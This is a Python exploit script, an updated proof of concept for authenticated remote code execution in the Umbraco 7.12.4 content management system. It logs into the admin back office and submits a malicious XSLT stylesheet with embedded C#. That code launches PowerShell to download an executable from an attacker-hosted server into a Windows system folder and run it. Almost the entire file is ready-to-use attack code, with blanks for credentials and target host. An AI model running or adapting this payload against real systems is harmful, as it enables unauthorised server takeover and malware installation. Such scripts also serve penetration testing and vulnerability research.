# Umbraco 7.12.4 Authenticated RCE
# Original PoC: https://www.exploit-db.com/exploits/46153
# Updated by @deathflash1411

print("+----------------------------------+")
print("| UMBRACO 7.12.4 Authenticated RCE |")
print("|    Updated by @deathflash1411    |")
print("+----------------------------------+")

import requests;

from bs4 import BeautifulSoup;

def print_dict(dico):
    print(dico.items());

# Powershell payload to download and execute a file
# Modify x.x.x.x with the IP address where the payload is being hosted
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = "IWR http://x.x.x.x/payload.exe -outfile c:/windows/system32/spool/drivers/color/payload.exe;c:/windows/system32/spool/drivers/color/payload.exe"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "powershell"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ';

# Modify these
username = ""; #umbraco admin username/email
password = ""; #umbraco admin password
host = "http://"; #umbraco host address

print("\n [!] Exploiting " + host)

s = requests.session()
url_main =host+"/umbraco/";
r1 = s.get(url_main);
print_dict(r1.cookies);

url_login = host+"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin";
loginfo = {"username":username,"password":password};
r2 = s.post(url_login,json=loginfo);

url_xslt = host+"/umbraco/developer/Xslt/xsltVisualize.aspx";
r3 = s.get(url_xslt);

soup = BeautifulSoup(r3.text, 'html.parser');
VIEWSTATE = soup.find(id="__VIEWSTATE")['value'];
VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value'];
UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];
headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};
data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,"ctl00$body$xsltSelection":payload,"ctl00$body$contentPicker$ContentIdValue":"","ctl00$body$visualizeDo":"Visualize+XSLT"};

print("\n [!] Sending payload")

r4 = s.post(url_xslt,data=data,headers=headers)
